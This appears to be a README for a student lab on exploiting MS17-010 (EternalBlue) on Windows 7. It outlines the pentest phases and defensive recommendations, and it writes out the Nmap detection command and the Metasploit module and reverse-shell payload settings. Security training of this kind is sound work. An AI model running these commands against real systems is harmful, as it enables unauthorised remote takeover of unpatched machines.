# CVE-2017-0143 | MS17-010 EternalBlue Lab

Môi trường thực hành và báo cáo lab về khai thác lỗ hổng MS17-010 (EternalBlue) trên Windows 7 SP1 x64 bằng Metasploit Framework trong hệ thống mạng ảo VMware NAT.

Lab tập trung vào toàn bộ quy trình kiểm thử xâm nhập gồm:

- Reconnaissance
- Enumeration
- Vulnerability Assessment
- Exploitation
- Post-Exploitation

---

# Overview

Lab mô phỏng tình huống pentest nội bộ, trong đó máy Windows 7 chưa được vá MS17-010 và vẫn bật SMBv1.

Pentester sử dụng Kali Linux để:

- Quét dịch vụ SMB
- Xác minh CVE-2017-0143
- Khai thác EternalBlue
- Chiếm quyền SYSTEM trên máy mục tiêu

---

# Objectives

- Thiết lập môi trường VMware NAT
- Kiểm tra kết nối attacker và victim
- Quét và phân tích SMB service
- Phát hiện lỗ hổng bằng Nmap NSE
- Khai thác EternalBlue bằng Metasploit
- Thiết lập Meterpreter reverse shell
- Phân tích kernel exploitation workflow
- Thực hiện post-exploitation cơ bản

---

# Lab Environment

| Component | Information |
|---|---|
| Hypervisor | VMware Workstation |
| Attacker | Kali Linux 2022.3 |
| Victim | Windows 7 Professional SP1 x64 |
| Network Mode | VMnet8 NAT |
| Subnet | 208.100.26.0/24 |
| Metasploit | v6.2.9-dev |
| Vulnerability | MS17-010 / CVE-2017-0143 |

---

# Attack Workflow

## 1. Network Configuration

- Configure VMnet8 NAT
- Ensure attacker and victim are in the same subnet
- Verify ICMP connectivity

## 2. Reconnaissance

- Identify target IP
- Perform SYN Scan using Nmap
- Analyze firewall state and port exposure

## 3. Enumeration

- Detect SMB services
- Verify port 445/tcp
- Check SMBv1 accessibility

## 4. Vulnerability Assessment

```bash
nmap -p445 --script smb-vuln-ms17-010 <target-ip>
```

- Confirm CVE-2017-0143 vulnerable state

## 5. Exploitation

### Metasploit Module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### Payload

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

### Configuration

```bash
set RHOSTS <victim-ip>
set LHOST <attacker-ip>
set LPORT 445
run
```

## 6. Post-Exploitation

- Establish Meterpreter session
- Verify SYSTEM privileges
- Validate system access

---

# Technical Topics

## Networking

- TCP/IP
- NAT Networking
- VMware Virtual Networking
- ICMP
- TCP SYN Scan
- Port Scanning
- Reverse TCP Connection

## Operating Systems

- Windows 7 SP1 x64
- Linux Networking
- Windows Firewall
- SMB Architecture
- Windows Kernel Memory

## Security Concepts

- Vulnerability Assessment
- Exploitation
- Remote Code Execution (RCE)
- Buffer Overflow
- Kernel Exploitation
- Pool Grooming
- Post-Exploitation
- Privilege Escalation

## Protocols

- SMBv1
- NetBIOS
- Microsoft RPC
- DCE/RPC

## Tools

- Nmap
- NSE Scripts
- Metasploit Framework
- Meterpreter
- VMware Workstation

---

# Skills Practiced

## Offensive Security

- Network reconnaissance
- Service enumeration
- Vulnerability verification
- Exploit execution
- Payload configuration
- Reverse shell handling

## Defensive Understanding

- Firewall impact analysis
- SMB attack surface analysis
- Legacy protocol risks
- Patch management awareness
- Segmentation importance

## Technical Analysis

- Reading Nmap outputs
- Interpreting vulnerability scan results
- Understanding exploit workflow
- Analyzing Meterpreter sessions
- Understanding kernel exploitation concepts

---

# Key Vulnerability Information

| Field | Value |
|---|---|
| Vulnerability | MS17-010 |
| CVE | CVE-2017-0143 |
| Exploit | EternalBlue |
| Severity | HIGH |
| CVSS Score | 8.8 |
| Attack Vector | Network |
| User Interaction | None |
| Affected Service | SMBv1 |

---

# Learning Outcomes

Sau khi hoàn thành lab này, người học có thể:

- Hiểu cơ chế hoạt động của EternalBlue
- Phân tích SMB service trên Windows
- Sử dụng Nmap cho reconnaissance và vulnerability scanning
- Sử dụng Metasploit để khai thác RCE
- Hiểu reverse shell workflow
- Phân tích tác động của firewall đối với pentest
- Hiểu hậu quả của SMBv1 và hệ thống chưa vá

---

# Security Recommendations

- Vá MS17-010 trên toàn bộ hệ thống
- Tắt SMBv1
- Bật Windows Firewall đúng cách
- Không expose port 445 ra Internet
- Thực hiện vulnerability scanning định kỳ
- Áp dụng network segmentation
- Triển khai IDS/IPS và EDR

---

# Disclaimer

Repository này phục vụ mục đích học tập, nghiên cứu an ninh mạng và thực hành trong môi trường lab kiểm soát.

Không sử dụng các kỹ thuật hoặc công cụ trong repository này để tấn công hệ thống trái phép.

---

# References

- Microsoft Security Bulletin MS17-010
- CVE-2017-0143
- NIST National Vulnerability Database
- Metasploit Framework Documentation
- Nmap NSE Documentation
